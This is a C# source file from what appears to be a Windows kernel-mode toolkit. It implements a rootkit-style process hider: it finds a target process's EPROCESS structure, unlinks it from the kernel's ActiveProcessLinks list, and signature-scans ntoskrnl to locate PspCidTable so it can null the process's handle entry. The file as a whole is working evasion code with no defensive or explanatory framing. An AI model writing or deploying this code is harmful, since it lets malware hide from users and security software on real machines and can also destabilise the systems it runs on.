using System;
using KernelMode.Driver;
using KernelMode.Providers;

namespace KernelMode.Utils
{
    public static class ProcessHider
    {
        private static ulong _pspCidTable = 0;

        // Signature to find the PspCidTable pointer in ntoskrnl.exe: mov rcx, [nt!PspCidTable]
        private static readonly byte[] PspCidTableSignature = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15 };

        /// <summary>
        /// Hides a process from most enumeration methods by unlinking it from the
        /// active process list and the kernel's CID handle table.
        /// </summary>
        public static bool HideProcess(int pid)
        {
            if (!KernelMemory.IsReady)
            {
                Console.WriteLine("[-] Provider not initialized. Cannot hide process.");
                return false;
            }

            var provider = KernelMemory.GetProvider();
            ulong targetEprocess = EprocessScanner.FindEprocessByPid(provider, pid);
            if (targetEprocess == 0)
            {
                Console.WriteLine($"[-] Failed to find EPROCESS for PID {pid}.");
                return false;
            }
            Console.WriteLine($"[*] Found EPROCESS for PID {pid} at 0x{targetEprocess:X}");

            if (!UnlinkFromActiveProcessLinks(targetEprocess))
            {
                Console.WriteLine("[-] Failed to unlink from ActiveProcessLinks list. Aborting.");
                return false;
            }

            if (!UnlinkFromCidTable(pid))
            {
                Console.WriteLine("[-] Failed to unlink from PspCidTable. The process may be partially hidden.");
                return false;
            }

            Console.WriteLine($"[+] Successfully hid process with PID {pid}.");
            return true;
        }

        private static bool UnlinkFromActiveProcessLinks(ulong eprocess)
        {
            ulong activeProcessLinksOffset = (ulong)OffsetResolver.Resolve("ActiveProcessLinks");
            if (activeProcessLinksOffset == 0)
            {
                Console.WriteLine("[-] Failed to resolve ActiveProcessLinks offset.");
                return false;
            }

            ulong listEntryAddress = eprocess + activeProcessLinksOffset;
            ulong flink = KernelMemory.ReadQword(listEntryAddress);
            ulong blink = KernelMemory.ReadQword(listEntryAddress + 8);

            if (flink == 0 || blink == 0)
            {
                Console.WriteLine("[-] Failed to read Flink/Blink from the process list entry.");
                return false;
            }

            Console.WriteLine($"[*] Unlinking from ActiveProcessLinks... Flink: 0x{flink:X}, Blink: 0x{blink:X}");

            if (!KernelMemory.WriteQword(blink, flink) || !KernelMemory.WriteQword(flink + 8, blink))
            {
                Console.WriteLine("[-] Failed to update Flink/Blink pointers.");
                return false;
            }

            Console.WriteLine("[+] Unlinked from ActiveProcessLinks successfully.");
            return true;
        }

        private static bool UnlinkFromCidTable(int pid)
        {
            if (_pspCidTable == 0)
            {
                _pspCidTable = FindPspCidTableAddress();
                if (_pspCidTable == 0)
                {
                    Console.WriteLine("[-] Failed to find PspCidTable address.");
                    return false;
                }
                Console.WriteLine($"[*] Found PspCidTable at: 0x{_pspCidTable:X}");
            }

            ulong handleTableEntryAddress = GetCidHandleTableEntryAddress(_pspCidTable, pid);
            if (handleTableEntryAddress == 0)
            {
                Console.WriteLine($"[-] Failed to find handle table entry for PID {pid}.");
                return false;
            }
            Console.WriteLine($"[*] Found handle table entry for PID {pid} at 0x{handleTableEntryAddress:X}");

            // Overwrite the handle table entry with NULL to prevent lookups.
            if (!KernelMemory.WriteQword(handleTableEntryAddress, 0))
            {
                Console.WriteLine("[-] Failed to write to handle table entry.");
                return false;
            }

            Console.WriteLine("[+] Unlinked from PspCidTable successfully.");
            return true;
        }

        private static ulong FindPspCidTableAddress()
        {
            var ntoskrnl = DriverLoader.GetKernelModule("ntoskrnl.exe");
            if (ntoskrnl.ImageBase == IntPtr.Zero) return 0;

            byte[] ntoskrnlImage = new byte[ntoskrnl.ImageSize];
            if (!KernelMemory.Read((ulong)ntoskrnl.ImageBase, ntoskrnlImage, ntoskrnlImage.Length)) return 0;

            for (int i = 0; i < ntoskrnlImage.Length - PspCidTableSignature.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < PspCidTableSignature.Length; j++)
                {
                    if (PspCidTableSignature[j] != 0x00 && ntoskrnlImage[i + j] != PspCidTableSignature[j])
                    {
                        found = false;
                        break;
                    }
                }

                if (found)
                {
                    int relativeOffset = BitConverter.ToInt32(ntoskrnlImage, i + 3);
                    ulong instructionAddress = (ulong)ntoskrnl.ImageBase + (ulong)i;
                    ulong pointerAddress = instructionAddress + 7 + (ulong)relativeOffset;
                    return KernelMemory.ReadQword(pointerAddress);
                }
            }
            return 0;
        }

        private static ulong GetCidHandleTableEntryAddress(ulong pspCidTable, int pid)
        {
            // The PID is the handle, and handles are multiples of 4.
            // The index into the table is the handle value divided by 4.
            ulong handleIndex = (ulong)pid / 4;

            ulong handleTable = KernelMemory.ReadQword(pspCidTable);
            if (handleTable == 0)
            {
                Console.WriteLine("[-] PspCidTable points to NULL.");
                return 0;
            }

            ulong tableCode = KernelMemory.ReadQword(handleTable);
            var tableLevel = tableCode & 3;

            // The table base address is stored in the TableCode, masking the low 2 bits.
            ulong tableBase = tableCode & ~3UL;

            if (tableLevel == 0) // 1-level table
            {
                // Direct lookup in the single-level table.
                return tableBase + (handleIndex * 16);
            }
            else if (tableLevel == 1) // 2-level table
            {
                // Index into the first-level page to get the second-level page.
                ulong level1Index = handleIndex >> 9;
                ulong level0Page = KernelMemory.ReadQword(tableBase + (level1Index * 8));
                if (level0Page == 0) return 0;

                // Index into the second-level page to get the final entry.
                ulong level0Index = handleIndex & 0x1FF;
                return level0Page + (level0Index * 16);
            }
            else if (tableLevel == 2) // 3-level table
            {
                // Index into the top-level page.
                ulong level2Index = handleIndex >> 18;
                ulong level1Page = KernelMemory.ReadQword(tableBase + (level2Index * 8));
                if (level1Page == 0) return 0;

                // Index into the mid-level page.
                ulong level1Index = (handleIndex >> 9) & 0x1FF;
                ulong level0Page = KernelMemory.ReadQword(level1Page + (level1Index * 8));
                if (level0Page == 0) return 0;

                // Index into the bottom-level page.
                ulong level0Index = handleIndex & 0x1FF;
                return level0Page + (level0Index * 16);
            }
            else
            {
                Console.WriteLine($"[-] Invalid or unsupported handle table level: {tableLevel}.");
                return 0;
            }
        }
    }
}